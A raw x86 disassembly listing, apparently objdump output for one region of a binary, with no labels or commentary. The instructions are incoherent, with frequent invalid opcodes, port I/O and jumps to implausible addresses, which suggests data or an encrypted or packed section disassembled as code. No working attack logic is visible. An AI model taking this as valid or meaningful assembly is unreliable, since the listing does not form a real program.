  404794:	mov    esp,0xdcc4cc0f
  404799:	in     al,0xe4
  40479b:	test   esi,0xe2ebccc3
  4047a1:	(bad)  
  4047a2:	out    dx,al
  4047a3:	(bad)  
  4047a4:	rcl    dh,cl
  4047a6:	ror    ch,cl
  4047a8:	rcr    dl,cl
  4047aa:	int    0xb9
  4047ac:	mov    ah,0xc6
  4047ae:	(bad)
  4047b1:	shl    edi,0xe
  4047b4:	out    dx,eax
  4047b5:	add    BYTE PTR [ebx],dl
  4047b7:	stc    
  4047b8:	f2xm1  
  4047ba:	fcom   st(6)
  4047bc:	(bad)  
  4047bd:	mov    bl,0xd4
  4047bf:	jmp    0x4047a2
  4047c1:	fcmovne st,st(2)
  4047c3:	xabort 0xdb
  4047c6:	enter  0xf9d3,0xc3
  4047ca:	mov    esp,0xf6f702d6
  4047cf:	add    eax,0xfc08da02
  4047d4:	call   0xe62c3cc1
  4047d9:	icebp  
  4047da:	into   
  4047db:	out    0xcb,eax
  4047dd:	int3   
  4047de:	div    DWORD PTR [ebx-0xb052d37]
  4047e4:	in     eax,dx
  4047e5:	cld    
  4047e6:	mov    esi,0xc0faf2ba
  4047eb:	std    
  4047ec:	fsin   
  4047ee:	or     eax,DWORD PTR [ecx+ebp*8]
  4047f1:	ret    
  4047f2:	lock push es
  4047f4:	cmc    
  4047f5:	add    eax,DWORD PTR [edi]
  4047f7:	loopne 0x404804
  4047f9:	ffree  st(6)
  4047fb:	repnz mov esi,0xf5cfece7
  404801:	aam    0xe0
  404803:	out    0xd5,al
  404805:	jmp    ebx
  404807:	fadd   QWORD PTR [ebx]
  404809:	aad    0xe1
  40480b:	(bad)  
  40480d:	(bad)  
  40480e:	mov    esi,0xe9ffd6d6
  404813:	jmp    edx
  404815:	add    al,0x2
  404817:	adc    bh,al
  404819:	lock scas eax,DWORD PTR es:[edi]
  40481b:	repnz out dx,al
  40481d:	int    0xd7
  40481f:	ret    
  404820:	in     al,dx
  404821:	mov    bl,0xdf
  404823:	mov    cl,0xcd
  404825:	fstp   st(2)
  404827:	repnz add DWORD PTR [edi-0x42050b12],edi
  40482e:	loop   0x40480c
  404830:	icebp  
  404831:	add    eax,0xda0702c6
  404836:	retf   
  404837:	(bad)  
  404838:	fld    st(5)
  40483a:	repz lds edi,FWORD PTR [ecx+ebp*8-0x114e242c]
  404842:	enter  0xe4c7,0xba
  404846:	retf   
  404847:	fstp   st(2)
  404849:	sar    BYTE PTR [ebp+0xf5c6db],cl
  40484f:	(bad)  
  404850:	shl    dl,1
  404852:	(bad)
  404855:	fsub   st(2),st
  404857:	les    eax,FWORD PTR [eax]
  404859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40485a:	out    dx,eax
  40485b:	icebp  
  40485c:	xlat   BYTE PTR ds:[ebx]
  40485d:	in     eax,0xe1
  40485f:	lods   al,BYTE PTR ds:[esi]
  404860:	test   ecx,0xd5f4c9df
  404866:	mov    ecx,0xd4d4dcdc
  40486b:	(bad)  
  40486c:	fpatan 
  40486e:	inc    al
  404870:	loop   0x40485d
  404872:	or     ch,bh
  404874:	fild   DWORD PTR [edi]
  404876:	clc    
  404877:	fcmovne st,st(7)
  404879:	stos   BYTE PTR es:[edi],al
  40487a:	int    0xca
  40487c:	mov    esp,0xccefaabc
  404881:	mov    dh,0xf3
  404883:	call   0xed1c3e54
  404888:	cmc    
  404889:	call   0xf226458f
  40488e:	std    
  40488f:	cld    
  404890:	std    
  404891:	(bad)  
  404892:	(bad)  
  404894:	cmc    
  404895:	add    al,0xe4
  404897:	into   
  404898:	loopne 0x404859
  40489a:	enter  0xe9e1,0xf6
  40489e:	in     eax,dx
  40489f:	(bad)  
  4048a0:	sar    ebx,1
  4048a2:	mov    eax,0xd5b5f1b4
  4048a7:	retf   0xe3e2
  4048aa:	(bad)  
  4048ab:	(bad)  
  4048ac:	fprem  
  4048ae:	loopne 0x404896
  4048b0:	fchs   
  4048b2:	rol    BYTE PTR ds:0x8c2dc0b,0x2
  4048b9:	in     al,0xe9
  4048bb:	vpaddusw ymm4,ymm1,ymm4
  4048bf:	cli    
  4048c0:	mov    bh,0xd0
  4048c2:	mov    eax,0xd8c8fdec
  4048c7:	out    dx,eax
  4048c8:	mov    edx,0xf2daded5
  4048cd:	add    dh,dh
  4048cf:	(bad)  
  4048d0:	rol    DWORD PTR [edi],1
  4048d2:	xbegin 0xf092a94
  4048d8:	or     bh,BYTE PTR [ecx-0x222f2f56]
  4048de:	scas   al,BYTE PTR es:[edi]
  4048df:	out    dx,al
  4048e0:	ret    0xbbd3
  4048e3:	rcr    dh,cl
  4048e5:	xlat   BYTE PTR ds:[ebx]
  4048e6:	sar    DWORD PTR [ecx-0x460a4207],1
  4048ec:	cld    
  4048ed:	mov    edi,0xd9f4f7da
  4048f2:	enter  0xf80e,0xb
  4048f6:	clc    
  4048f7:	push   cs
  4048f8:	add    edi,DWORD PTR [ecx-0x422f3928]
  4048fe:	leave  
  4048ff:	(bad)
  404902:	(bad)  
  404903:	fxch   st(0)
  404905:	out    dx,al
  404906:	in     al,dx
  404907:	cld    
  404908:	std    
  404909:	icebp  
  40490a:	ror    esi,0xde
  40490d:	mov    ebx,0xa050206
  404912:	(bad)  
  404913:	call   0xd9210d05
  404918:	pop    es
  404919:	scas   al,BYTE PTR es:[edi]
  40491a:	in     eax,dx
  40491b:	rep lods al,BYTE PTR ds:[esi]
  40491d:	out    0xb2,eax
  40491f:	mov    ch,0xca
  404921:	bnd jmp 0xe91108e2
  404927:	retf   
  404928:	int    0xf9
  40492a:	stc    
  40492b:	loop   0x404905
  40492d:	mov    bl,0xda
  404930:	loope  0x4048f5
  404932:	add    al,dh
  404934:	dec    bh
  404936:	aam    0xe0
  404938:	add    eax,0xefa9f0bf
  40493d:	in     al,dx
  40493e:	(bad)  
  40493f:	idiv   edx
  404941:	out    dx,al
  404942:	out    0xc8,eax
  404944:	mov    ah,0xf7
  404946:	xlat   BYTE PTR ds:[ebx]
  404947:	(bad)  
  404948:	aad    0xc9
  40494a:	cmc    
  40494b:	iret   
  40494c:	fld    QWORD PTR [esi]
  40494e:	shr    ebx,0xd1
  404951:	in     al,0xdf
  404953:	out    dx,al
  404954:	add    esp,edi
  404956:	into   
  404957:	add    cl,cl
  404959:	mov    esi,0xe3c9caaf
  40495e:	retf   0xf0d1
  404961:	sti    
  404962:	xlat   BYTE PTR ds:[ebx]
  404963:	repz out dx,al
  404965:	mov    eax,0xdfd5dbc9
  40496a:	icebp  
  40496b:	loopne 0x404948
  40496d:	in     al,dx
  40496e:	(bad)  
  40496f:	clc    
  404970:	(bad)  
  404971:	xlat   BYTE PTR ds:[ebx]
  404972:	(bad)  [ebx]
  404974:	(bad)  
  404975:	stc    
  404976:	or     eax,0xc9afe0fa
  40497b:	loopne 0x404948
  40497d:	aad    0xd1
  40497f:	lods   eax,DWORD PTR ds:[esi]
  404980:	retf   0xcccf
  404983:	repz int3 
  404985:	repnz retf 
  404987:	mov    ecx,0xd207f5f4
  40498c:	mov    esp,0xbc01c703
  404991:	retf   
  404992:	(bad)  
  404995:	jecxz  0x404960
  404997:	or     al,0x6
  404999:	jecxz  0x404947
  40499b:	fucomp st(4)
  40499d:	jmp    0xb0344150
  4049a2:	mov    ebx,0xd3d8cbcd
  4049a7:	repz test al,0xd8
  4049ab:	fcmovnu st,st(3)
  4049ad:	mov    DWORD PTR [eax*1-0x1df03e23],0xeb0a0bda
  4049b8:	call   0xed201aa8
  4049bd:	mov    ch,0xb2
  4049bf:	(bad)  
  4049c0:	leave  
  4049c1:	hlt    
  4049c2:	lock clc 
  4049c4:	mov    dh,0xdc
  4049c6:	hlt    
  4049c7:	cmc    
  4049c8:	lock xacquire add DWORD PTR [esi+0xbf2bff5],edi
  4049d0:	clc    
  4049d1:	jmp    0xc823399a
  4049d6:	retf   
  4049d7:	retf   
  4049d8:	or     al,0xcd
  4049da:	fsubr  st(7),st
  4049dc:	loopne 0x4049c3
  4049de:	mov    esp,0xd7dbeab1
  4049e3:	mov    al,0xb0
  4049e5:	mov    edi,0xf0fccfbf
  4049ea:	icebp  
  4049eb:	rcl    edx,0xf0
  4049ee:	fstp   st(1)
  4049f0:	add    eax,0x7dbf7c4
  4049f5:	or     edi,eax
  4049f7:	fmul   DWORD PTR ds:0xf1ccc6ac
  4049fd:	retf   
  4049fe:	mov    ch,0xc1
  404a00:	mov    cl,0xe9
  404a02:	call   0xdd3d32d8
  404a07:	xlat   BYTE PTR ds:[ebx]
  404a08:	repnz (bad) 
  404a0a:	cld    
  404a0b:	mov    edi,0xe3bed507
  404a10:	mov    esp,0xe4efe1cb
  404a15:	fabs   
  404a17:	fld    QWORD PTR [ebx]
  404a19:	rol    ecx,cl
  404a1b:	mov    bh,0xd1
  404a1d:	in     eax,0xc5
  404a1f:	leave  
  404a20:	fcmovnbe st,st(3)
  404a22:	fcmovnu st,st(2)
  404a24:	neg    cl
  404a26:	repz rcl al,1
  404a29:	mov    esp,0xf9b4dfb6
  404a2e:	mov    esi,0xdbfddac0
  404a33:	or     eax,edi
  404a35:	enter  0xed9,0xe8
  404a39:	iret   
  404a3a:	mov    al,0xc1
  404a3c:	mov    bh,0xee
  404a3e:	mov    al,0xec
  404a40:	(bad)  
  404a42:	iret   
  404a43:	int3   
  404a44:	icebp  
  404a45:	mov    ah,0xd4
  404a47:	fistp  QWORD PTR [edi-0x41030905]
  404a4d:	inc    edx
  404a4f:	or     ch,dl
  404a51:	mov    edi,0xc3e1d6d4
  404a56:	(bad)
  404a59:	loopne 0x404a4e
  404a5b:	(bad)  
  404a5c:	ret    0xd3e6
  404a5f:	aad    0xc5
  404a61:	loope  0x404a27
  404a63:	sar    bh,1
  404a65:	rcr    ebx,1
  404a67:	mov    ch,0xda
  404a69:	fcom   st(2)
  404a6b:	stc    
  404a6c:	ffree  st(1)
  404a6e:	jmp    eax
  404a70:	(bad)  
  404a73:	clc    
  404a74:	enter  0xc6f8,0xee
  404a78:	pop    es
  404a79:	jmp    0xb40a1466
  404a7e:	mov    ch,0xe6
  404a81:	int    0xca
  404a83:	(bad)  
  404a85:	shl    esp,1
  404a87:	fucom  st(3)
  404a89:	rol    cl,1
  404a8b:	idiv   DWORD PTR [ebp+0x4d307e5]
  404a91:	(bad)  
  404a92:	out    0x0,al
  404a94:	retf   
  404a95:	out    dx,eax
  404a96:	add    al,0xfd
  404a98:	stc    
  404a99:	in     eax,dx
  404a9a:	shl    BYTE PTR [ecx-0x333b3634],cl
  404aa0:	mov    bl,0xca
  404aa2:	mov    edx,0xcdcccefe
  404aa7:	jmp    0xc7de:0xf7ccbeb8
  404aae:	(bad)
  404ab1:	hlt    
  404ab2:	ret    0xfce6
  404ab5:	fld    DWORD PTR [esi]
  404ab7:	jmp    0xd6ee:0xc3aeebc8
  404abe:	mov    bh,0xe5
  404ac0:	test   esp,0xd6f7d5b0
  404ac6:	sti    
  404ac7:	mov    eax,0xcfffd7f0
  404acc:	rol    BYTE PTR [esi],0xfc
  404acf:	shl    dl,cl
  404ad1:	idiv   BYTE PTR [esi-0x1623fa1f]
  404ad7:	iret   
  404ad8:	push   es
  404ad9:	mov    esi,0xc6e0cfc3
  404ade:	loopne 0x404a9b
  404ae0:	jmp    0x404ab9
  404ae2:	int3   
  404ae3:	(bad)  
  404ae4:	imul   eax
  404ae6:	mov    edi,0x103f203
  404aeb:	fcmove st,st(6)
  404aed:	call   eax
  404aef:	ret    
  404af0:	loop   0x404afd
  404af2:	push   es
  404af3:	leave  
  404af4:	loope  0x404af2
  404af6:	int3   
  404af7:	loope  0x404adc
  404af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404afa:	fucomp st(1)
  404afc:	loopne 0x404ae4
  404afe:	mov    bl,0xeb
  404b00:	(bad)
  404b03:	mov    edx,0xf3cac8c5
  404b08:	ret    
  404b09:	aam    0xc1
  404b0b:	out    0xd7,eax
  404b0d:	int    0xc6
  404b0f:	fld    DWORD PTR [ecx]
  404b11:	fcmovne st,st(3)
  404b13:	shl    esp,0xc7
  404b16:	fucomip st,st(7)
  404b18:	les    edi,FWORD PTR [eax-0x1a223e1c]
  404b1e:	stos   BYTE PTR es:[edi],al
  404b1f:	in     al,0xe9
  404b21:	mov    dl,0xd8
  404b23:	out    0xdf,eax
  404b25:	xlat   BYTE PTR ds:[ebx]
  404b26:	in     al,0xbb
  404b28:	sar    bl,1
  404b2a:	(bad)  
  404b2c:	fcmovne st,st(5)
  404b2e:	sti    
  404b2f:	aad    0xe6
  404b31:	fadd   DWORD PTR ds:0xc9d4ced4
  404b37:	enter  0xa701,0xb8
  404b3b:	retf   0xd4e7
  404b3e:	repnz in al,0xa8
  404b41:	mul    ah
  404b43:	in     al,0xbb
  404b45:	out    dx,al
  404b46:	repz int 0xbb
  404b49:	iret   
  404b4a:	ret    
  404b4b:	out    0xe7,al
  404b4d:	fcmovnb st,st(0)
  404b4f:	(bad)  
  404b50:	jmp    0xa175b3f
  404b55:	fiadd  WORD PTR ds:0xaaa80b06
  404b5b:	fnsave [eax-0x293c1d55]
  404b61:	sti    
  404b62:	mov    ecx,0xb9eafbad
  404b67:	stc    
  404b68:	into   
  404b69:	add    bh,cl
  404b6b:	repz fiadd DWORD PTR [ebx]
  404b6e:	cmc    
  404b6f:	fst    st(4)
  404b71:	stc    
  404b72:	cmc    
  404b73:	pop    es
  404b74:	loop   0x404b44
  404b76:	fisttp WORD PTR [ecx]
  404b78:	or     al,0xbc
  404b7a:	ror    esi,0xb0
  404b7d:	mov    bh,0xd7
  404b7f:	jmp    0xcc0a0c5d
  404b84:	iret   
  404b85:	mov    edi,0xfdbdcace
  404b8a:	add    esp,edi
  404b8c:	icebp  
  404b8d:	hlt    
  404b8e:	fadd   DWORD PTR [edi]
  404b90:	rol    DWORD PTR [ebx],1
  404b92:	or     cl,ah
  404b94:	std    
  404b95:	out    dx,eax
  404b96:	out    dx,al
  404b97:	add    eax,0xe9eda8e1
  404b9c:	int    0xc9
  404b9e:	mov    bh,0xb4
  404ba0:	enter  0xcae4,0xc9
  404ba4:	mov    ecx,0xecb1cef8
  404ba9:	out    dx,al
  404baa:	repz mov ecx,0xeb02edff
  404bb0:	or     dl,al
  404bb2:	cmc    
  404bb3:	(bad)
  404bb6:	clc    
  404bb7:	ror    DWORD PTR [ebx],cl
  404bb9:	stos   BYTE PTR es:[edi],al
  404bba:	(bad)  
  404bbb:	loop   0x404b6f
  404bbd:	xlat   BYTE PTR ds:[ebx]
  404bbe:	mov    ch,0xec
  404bc0:	mov    ch,0xf0
  404bc2:	enter  0xc4f4,0xf8
  404bc6:	retf   
  404bc7:	mov    edi,0xceedbcbb
  404bcc:	repz int3 
  404bce:	out    0x2,eax
  404bd0:	(bad)  
  404bd3:	ror    DWORD PTR [edi],0xf
  404bd6:	add    BYTE PTR [ebx],cl
  404bd8:	(bad)  
  404bd9:	jecxz  0x404b9a
  404bdb:	repnz scas eax,DWORD PTR es:[edi]
  404bdd:	int    0xae
  404bdf:	loopne 0x404bd8
  404be1:	into   
  404be2:	int    0xc6
  404be4:	out    0xf8,al
  404be6:	retf   0xcdd0
  404be9:	fsub   st(7),st
  404beb:	int    0xc6
  404bed:	mov    ah,0x5
  404bf0:	out    0xc9,al
  404bf2:	loopne 0x404bdb
  404bf4:	retf   
  404bf5:	in     eax,0xec
  404bf7:	in     al,dx
  404bf8:	out    0xe5,al
  404bfa:	call   0xab08fbca
  404bff:	sti    
  404c00:	(bad)  
  404c01:	enter  0xe8d6,0xef
  404c05:	std    
  404c06:	jmp    0x404bfb
  404c08:	mov    ecx,0xd9ccfde1
  404c0d:	(bad)  
  404c0f:	add    eax,0x3e3f100
  404c14:	pmulhuw mm4,mm7
  404c17:	leave  
  404c18:	into   
  404c19:	mov    ebp,0xd1cfbde0
  404c1e:	out    0xad,eax
  404c20:	repnz mov cl,0xed
  404c23:	mov    edx,0xc9cdecbb
  404c28:	icebp  
  404c29:	mov    bh,0xfc
  404c2b:	fild   DWORD PTR [esi]
  404c2d:	add    eax,0xe6020be2
  404c32:	mov    esi,0xf9e2efc8
  404c37:	add    edi,esi
  404c39:	out    0xd3,eax
  404c3b:	in     al,dx
  404c3c:	lods   eax,DWORD PTR ds:[esi]
  404c3d:	int    0xc6
  404c3f:	mov    ebx,0xcacfc1d2
  404c44:	call   0xf8120324
  404c49:	mov    esi,0xccd8d8de
  404c4e:	jecxz  0x404c16
  404c50:	fiadd  DWORD PTR [edx]
  404c52:	rol    BYTE PTR [esi],0xd6
  404c55:	(bad)  
  404c56:	(bad)  
  404c58:	fucomip st,st(4)
  404c5a:	scas   eax,DWORD PTR es:[edi]
  404c5b:	mov    esi,0xfae8bcb7
  404c60:	out    0xe9,al
  404c62:	xlat   BYTE PTR ds:[ebx]
  404c63:	rol    ch,cl
  404c65:	in     al,0xfa
  404c67:	int3   
  404c68:	enter  0xef03,0xfa
  404c6c:	cmc    
  404c6d:	mov    ebx,0xc6f6f0fd
  404c72:	enter  0xce08,0xea
  404c76:	(bad)  
  404c77:	inc    BYTE PTR [ebx+edx*8]
  404c7a:	loope  0x404c3d
  404c7c:	jmp    0x404c6e
  404c7e:	xlat   BYTE PTR ds:[ebx]
  404c7f:	test   eax,0xd8dff9d9
  404c84:	in     eax,dx
  404c85:	iret   
  404c86:	cli    
  404c87:	repnz mov edx,0x5bfdfdc
  404c8d:	(bad)  
  404c8e:	loop   0x404c8d
  404c90:	cli    
  404c91:	out    0xbe,al
  404c93:	(bad)  
  404c94:	jecxz  0x404c76
  404c96:	jmp    0xcdcf:0xdde0eeda
  404c9d:	jmp    0xba29176f
  404ca2:	lock sti 
  404ca4:	std    
  404ca5:	iret   
  404ca6:	hlt    
  404ca7:	mov    esi,0xf3cfca
  404cac:	cld    
  404cad:	in     eax,dx
  404cae:	mov    esp,0xc4c0c7b9
  404cb3:	add    ah,ch
  404cb5:	fxtract 
  404cb7:	inc    BYTE PTR [esp+eiz*8]
  404cba:	rcr    bh,0xd1
  404cbd:	aam    0xd3
  404cbf:	mov    ch,0xb3
  404cc1:	clc    
  404cc2:	out    0xcf,eax
  404cc4:	mov    edi,0xddbdb4d8
  404cc9:	aam    0xcf
  404ccb:	repz (bad) 
  404ccd:	add    ebx,ecx
  404ccf:	ret    
  404cd0:	jecxz  0x404c97
  404cd2:	fcmovnu st,st(4)
  404cd4:	inc    DWORD PTR [eax+eiz*8]
  404cd7:	(bad)  
  404cd9:	in     al,0xed
  404cdb:	mov    ebp,0xe5d3b1d5
  404ce0:	lods   al,BYTE PTR ds:[esi]
  404ce1:	mov    ch,0xdf
  404ce3:	int    0xfa
  404ce5:	cld    
  404ce6:	mov    ecx,0xd6ededed
  404ceb:	(bad)  
  404ced:	fcmovnu st,st(6)
  404cef:	shl    edi,0xc5
  404cf2:	inc    BYTE PTR [eax]
  404cf4:	hlt    
  404cf5:	sti    
  404cf6:	or     eax,edi
  404cf8:	add    al,0xac
  404cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cfb:	loopne 0x404cf0
  404cfd:	mov    al,0xf2
  404cff:	fcmovnu st,st(2)
  404d01:	ror    ebx,1
  404d03:	fdiv   st,st(6)
  404d05:	cmc    
  404d06:	retf   0xbcc3
  404d09:	mov    esi,0xf0ce02f6
  404d0e:	aam    0x4
  404d10:	jmp    0xd9c5:0xdb08dad4
  404d17:	or     ebx,esi
  404d19:	repz retf 0xcdc8
  404d1d:	retf   0xe8f1
  404d20:	fcmove st,st(5)
  404d22:	loopne 0x404d15
  404d24:	xlat   BYTE PTR ds:[ebx]
  404d25:	cld    
  404d26:	mov    esi,0xf0f6f1d1
  404d2b:	fsubr  st,st(4)
  404d2d:	test   BYTE PTR [ecx],0xb9
  404d30:	fldl2e 
  404d32:	(bad)  
  404d33:	fsubr  st,st(0)
  404d35:	or     ebp,edi
  404d37:	into   
  404d38:	add    dh,al
  404d3a:	loope  0x404d22
  404d3c:	not    ebp
  404d3e:	sti    
  404d3f:	sar    cl,1
  404d41:	jmp    0xdaf63e2b
  404d46:	mov    edx,0xf2facab1
  404d4b:	ret    0xf200
  404d4e:	fcmovnbe st,st(5)
  404d50:	fcomip st,st(0)
  404d52:	jmp    0xea273514
  404d57:	repnz shl bl,cl
  404d5a:	ret    
  404d5b:	rcl    ch,1
  404d5d:	mov    bh,0xd7
  404d5f:	hlt    
  404d60:	mov    edx,0xf7b8d9c4
  404d65:	mov    ebp,0xfcf9e3cf
  404d6a:	int    0xf2
  404d6c:	in     eax,0xbe
  404d6e:	loope  0x404d4e
  404d70:	repnz add eax,esp
  404d73:	test   ah,0xf9
  404d76:	loope  0x404d53
  404d78:	fxch   st(5)
  404d7a:	ret    0xf3b0
  404d7d:	stos   DWORD PTR es:[edi],eax
  404d7e:	retf   
  404d7f:	in     eax,0xd9
  404d81:	mov    ebx,0xd0e5d0fa
  404d86:	into   
  404d87:	fdivr  DWORD PTR [ebp+edx*8-0x1e2c1328]
  404d8e:	mov    esp,0xe7fdf8e4
  404d93:	out    0xe5,eax
  404d95:	add    eax,0xd004fecc
  404d9a:	scas   al,BYTE PTR es:[edi]
  404d9b:	mov    edi,0xdae4c1f5
  404da0:	shl    BYTE PTR [ebx-0x2625393a],cl
  404da6:	add    ecx,ecx
  404da8:	loope  0x404d93
  404daa:	out    dx,al
  404dab:	ret    0xe1e1
  404dae:	or     esi,edx
  404db0:	lock or al,ah
  404db3:	idiv   dl
  404db5:	cmc    
  404db6:	in     eax,0x0
  404db8:	(bad)  
  404db9:	into   
  404dba:	repz int3 
  404dbc:	jmp    0x404d8a
  404dbe:	repz into 
  404dc0:	stc    
  404dc1:	mul    ebp
  404dc3:	jmp    0x33809b0
  404dc8:	ret    0x2fc
  404dcb:	cli    
  404dcc:	rcr    bh,1
  404dce:	(bad)  
  404dcf:	clc    
  404dd0:	or     bh,al
  404dd2:	lds    ecx,FWORD PTR [ecx]
  404dd4:	loope  0x404dc4
  404dd6:	fld    QWORD PTR [eax+eiz*8]
  404dd9:	int3   
  404dda:	loopne 0x404dc3
  404ddc:	loop   0x404da4
  404dde:	mov    ah,0xe7
  404de0:	rcr    cl,0xf1
  404de3:	mov    edx,0xecd3baf4
  404de8:	std    
  404de9:	jmp    0xbf3d41aa
  404dee:	shl    cl,0xd5
  404df1:	push   es
  404df2:	clc    
  404df3:	test   DWORD PTR [ecx],0xe40f09df
  404df9:	fcomp  st(0)
  404dfb:	mov    bh,0xb1
  404dfd:	mov    cl,0xd0
  404dff:	aam    0xe9
  404e01:	les    edi,FWORD PTR [ecx-0x170e22]
  404e07:	fnstsw WORD PTR [ebp-0x33fd3731]
  404e0d:	icebp  
  404e0e:	cld    
  404e0f:	add    ebp,edi
  404e11:	(bad)  
  404e12:	cmc    
  404e13:	add    ebp,edx
  404e15:	stc    
  404e16:	or     ch,ch
  404e18:	clc    
  404e19:	out    0xf7,eax
  404e1b:	xlat   BYTE PTR ds:[ebx]
  404e1c:	mov    cl,0xe4
  404e1e:	ror    esi,cl
  404e20:	repz cli 
  404e22:	mov    al,0xbb
  404e24:	mov    bh,0xbf
  404e26:	fxch   st(5)
  404e28:	leave  
  404e29:	hlt    
  404e2a:	int3   
  404e2b:	(bad)  
  404e2c:	cld    
  404e2d:	repnz cli 
  404e2f:	hlt    
  404e30:	test   dh,0xf0
  404e33:	jmp    0x404e17
  404e35:	(bad)  
  404e36:	cld    
  404e37:	into   
  404e38:	stc    
  404e39:	mov    ecx,0xb7eba8af
  404e3e:	lock mov cl,0xdb
  404e41:	aad    0xe4
  404e43:	out    dx,al
  404e44:	cli    
  404e45:	leave  
  404e46:	add    esp,ebx
  404e48:	ret    0xbfd9
  404e4b:	loope  0x404e0c
  404e4d:	ror    DWORD PTR [ebx],1
  404e4f:	sar    esp,1
  404e51:	cld    
  404e52:	(bad)
  404e55:	pavgw  mm3,mm3
  404e58:	retf   
  404e59:	mov    eax,0xd5debceb
  404e5e:	in     al,dx
  404e5f:	(bad)  
  404e60:	iret   
  404e61:	repnz (bad) 
  404e63:	in     al,0xc5
  404e65:	enter  0xf7c9,0xdb
  404e69:	ret    0xc2bd
  404e6c:	mov    ebp,0xe6d7ebbe
  404e72:	mov    esi,0xfcd8e4
  404e77:	adc    ah,bl
  404e79:	in     eax,0xb2
  404e7b:	shr    DWORD PTR [edi+ecx*8-0xc2a531d],1
  404e82:	imul   ecx
  404e84:	(bad)  
  404e86:	in     al,0xdb
  404e88:	(bad)  
  404e89:	std    
  404e8a:	sti    
  404e8b:	rcr    ah,1
  404e8d:	mov    esp,0xbf00fbfb
  404e92:	retf   0x7
  404e95:	fadd   st(5),st
  404e97:	fsubr  st(1),st
  404e99:	iret   
  404e9a:	(bad)  
  404e9c:	into   
  404e9d:	repz leave 
  404e9f:	out    0xd7,eax
  404ea1:	vpsubw ymm7,ymm1,ymm5
  404ea5:	cld    
  404ea6:	sti    
  404ea7:	mov    ch,0xca
  404ea9:	jmp    ecx
  404eab:	cld    
  404eac:	lock repnz loop 0x404e88
  404eb0:	fsub   st(2),st
  404eb2:	out    0xe2,al
  404eb4:	loope  0x404e95
  404eb6:	in     eax,dx
  404eb7:	add    eax,0xe7ddf1f3
  404ebc:	mov    ebp,0xace5f4cb
  404ec1:	mov    edx,0xe4f0dee9
  404ec6:	fsub   st,st(2)
  404ec8:	repz shl ebx,cl
  404ecb:	sar    DWORD PTR [eax-0x2d1c2c25],1
  404ed1:	aad    0xc1
  404ed3:	idiv   ch
  404ed5:	cli    
  404ed6:	leave  
  404ed7:	in     eax,0xf
  404ed9:	retf   
  404eda:	jmp    0xc82217b1
  404edf:	lock cmc 
  404ee1:	hlt    
  404ee2:	stc    
  404ee3:	lods   eax,DWORD PTR ds:[esi]
  404ee4:	fxch   st(6)
  404ee6:	(bad)  
  404ee7:	(bad)  
  404ee9:	add    ah,al
  404eeb:	add    DWORD PTR [esi],eax
  404eed:	icebp  
  404eee:	loopne 0x404ec5
  404ef0:	retf   
  404ef1:	ffree  st(1)
  404ef3:	rol    ah,0xc
  404ef6:	add    ebp,eax
  404ef8:	or     al,0xe6
  404efa:	retf   
  404efb:	mov    al,0xcd
  404efd:	in     eax,dx
  404efe:	lock shl bh,0xc0
  404f02:	aam    0xc6
  404f04:	sti    
  404f05:	out    dx,eax
  404f06:	aad    0xfe
  404f08:	retf   0xd2f1
  404f0b:	(bad)  
  404f0d:	xlat   BYTE PTR ds:[ebx]
  404f0e:	rol    esp,0xc3
  404f11:	std    
  404f12:	out    dx,eax
  404f13:	clc    
  404f14:	or     ch,bl
  404f16:	in     al,dx
  404f17:	ror    DWORD PTR [edi],cl
  404f19:	ret    0xedea
  404f1c:	out    0xd0,al
  404f1e:	leave  
  404f1f:	loopne 0x404f1b
  404f21:	retf   0xcee7
  404f24:	sar    BYTE PTR [esi-0x2807112f],cl
  404f2a:	add    cl,dl
  404f2c:	add    bl,al
  404f2e:	push   es
  404f2f:	shl    ebp,1
  404f31:	add    al,0xea
  404f33:	fsubrp st(4),st
  404f35:	loop   0x404f10
  404f37:	fcmovnu st,st(6)
  404f39:	out    dx,al
  404f3a:	mov    al,0xf0
  404f3c:	mov    bh,0xb0
  404f3e:	shr    DWORD PTR [ebp-0x4b375013],0xda
  404f45:	jmp    0xe3303b1f
  404f4a:	(bad)  
  404f4c:	xlat   BYTE PTR ds:[ebx]
  404f4d:	(bad)  
  404f4e:	div    esp
  404f50:	(bad)  
  404f52:	add    al,0xfe
  404f54:	(bad)  
  404f55:	fld    DWORD PTR [edx]
  404f57:	int    0xc4
  404f59:	lods   al,BYTE PTR ds:[esi]
  404f5a:	shl    dh,1
  404f5c:	(bad)  
  404f5d:	loop   0x404f2b
  404f5f:	(bad)  
  404f60:	in     eax,dx
  404f61:	retf   0xccc8
  404f64:	jmp    0xd9c9:0xcff8cdcf
  404f6b:	rol    BYTE PTR [edi],1
  404f6d:	sti    
  404f6e:	(bad)
  404f71:	std    
  404f72:	push   es
  404f73:	retf   0xc9e2
  404f76:	fstp   st(7)
  404f78:	in     eax,dx
  404f79:	enter  0xcdbf,0xcb
  404f7d:	ror    eax,1
  404f7f:	int3   
  404f80:	jmp    0xedd2:0xd7f1efd5
  404f87:	(bad)  
  404f89:	mov    ecx,0xfafee6cc
  404f8e:	mov    esp,0xe5d9c0e7
  404f93:	(bad)  
  404f95:	aam    0xcb
  404f97:	or     cl,ch
  404f99:	in     al,dx
  404f9a:	in     al,0xc8
  404f9c:	shl    BYTE PTR [ecx-0x3138053e],0xf3
  404fa3:	int3   
  404fa4:	(bad)  
  404fa5:	retf   
  404fa6:	(bad)  
  404fa7:	sar    DWORD PTR [eax-0x3d043127],1
  404fad:	sti    
  404fae:	fadd   st(1),st
  404fb0:	cmc    
  404fb1:	retf   0xef03
  404fb4:	fild   DWORD PTR ds:0xc3ebc905
  404fba:	mov    esp,0xbcf7eabc
  404fbf:	ret    0xcec4
  404fc2:	aad    0xee
  404fc4:	(bad)  
  404fc5:	mov    ebp,0xfeb0b1d5
  404fca:	(bad)  
  404fcb:	cli    
  404fcc:	(bad)  
  404fcd:	cli    
  404fce:	add    al,BYTE PTR [ebx+eiz*8]
  404fd1:	fsubrp st(1),st
  404fd3:	pop    es
  404fd4:	loopne 0x404fc3
  404fd6:	or     eax,0xecc4f800
  404fdb:	mov    dl,0xca
  404fdd:	ret    
  404fde:	hlt    
  404fdf:	sar    bl,cl
  404fe1:	clc    
  404fe2:	mov    dl,0xb4
  404fe4:	mov    dh,0xb9
  404fe6:	in     al,0xe3
  404fe8:	in     eax,dx
  404fe9:	xlat   BYTE PTR ds:[ebx]
  404fea:	into   
  404feb:	test   DWORD PTR [ecx],0xdeeb02bb
  404ff1:	rcr    bl,0xfa
  404ff4:	jecxz  0x404fce
